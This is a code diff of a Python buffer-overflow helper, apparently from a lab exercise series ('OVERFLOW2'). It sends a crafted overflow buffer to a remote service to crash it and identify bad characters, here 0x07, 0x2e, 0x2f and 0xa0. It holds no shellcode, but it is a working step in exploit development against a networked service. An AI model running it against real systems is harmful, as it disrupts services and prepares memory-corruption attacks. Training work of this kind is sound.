@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import sys
 import subprocess
 import socket
 import argparse
@@ -8,16 +9,29 @@ from typing import Optional
 
 def main(ip: str, port: int, eip_offset: int, overflow_threshold: int) -> None:
 	# Define prefix and buffer with encoded cyclic pattern
-	prefix = b"OVERFLOW1 "	
+	prefix = b"OVERFLOW2 "	# CHANGE
 	buffer = b"A" * eip_offset
 	eip = b"B" * 4
 	all_characters = bytearray(range(1, 256))
-	bad_characters = []
+	bad_characters = [  # CHANGE
+		b'\x07',
+		b'\x2e',
+		b'\x2f',
+		b'\xa0'
+	]
+
+	payload = b""
 
 	for bad_char in bad_characters:
-		all_characters = all_characters.replace(b"\x01", b"")
+		all_characters = all_characters.replace(bad_char, b"")
 
-	suffix = b"C" * (overflow_threshold - eip_offset - len(eip) - len(all_characters))
+	payload_size = eip_offset + len(eip) + len(all_characters) + len(bad_characters)
+
+	if payload_size > overflow_threshold:
+		print("The Overflow Threshold is too small, it should have a minimum value of:", eip_offset + len(eip) + len(all_characters) + len(bad_characters))
+		sys.exit(0)
+
+	suffix = b"C" * (overflow_threshold - payload_size)
 
 	timeout = 5
 	try:
@@ -30,8 +44,11 @@ def main(ip: str, port: int, eip_offset: int, overflow_threshold: int) -> None:
 			s.settimeout(timeout)
 
 			# Print server banner
-			response = s.recv(4096)
-			print(f"Banner: {response.decode()}")
+			try:
+				response = s.recv(4096)
+				print(f"{response.decode()}")
+			except:
+				pass
 
 			# Send data to the server
 			payload = b"".join(
@@ -49,26 +66,13 @@ def main(ip: str, port: int, eip_offset: int, overflow_threshold: int) -> None:
 			response = s.recv(4096)
 			# Print the response from the server
 			print(f"Response: {response.decode()}")
-	
+
+	except ConnectionError:
+		print('Connection Refused')
+		sys.exit(0)
 	except:
 		print("\n","="*25,"CRASH","="*25,"\n")
-		print(f"Application crashed at {len(payload) - len(prefix)} bytes!")
-		while True:
-			answer = input("Do you want to continue and find the set of bad characters? (y/n): ")
-			if answer.lower() == "y":
-				print("Starting to find bad characters with:")
-				print(f"\tIP: {ip}")
-				print(f"\tPort: {port}")
-				print(f"\tEIP Offset: {eip_offset}")
-				print(f"\tOverflow Threshold: {overflow_threshold}")
-				subprocess.run(['python', './004_bad_characters.py', ip, port, eip_offset, overflow_threshold])
-				break
-			elif answer.lower() == "n":
-				print("Exiting...")
-				break
-			else:
-				print("Invalid input, please enter 'y' or 'n'.")
-			
+		print(f"Application crashed at {len(payload) - len(prefix)} bytes! ({len(bad_characters)} bad characters)" )
 		sys.exit(0)
 
 if __name__ == "__main__":
@@ -88,4 +92,4 @@ if __name__ == "__main__":
 	args = parser.parse_args()
 
 	# Call main function
-	main(args.ip, args.port, args.offset, args.overflow_threshold)
+	main(args.ip, args.port, int(args.offset), int(args.overflow_threshold))
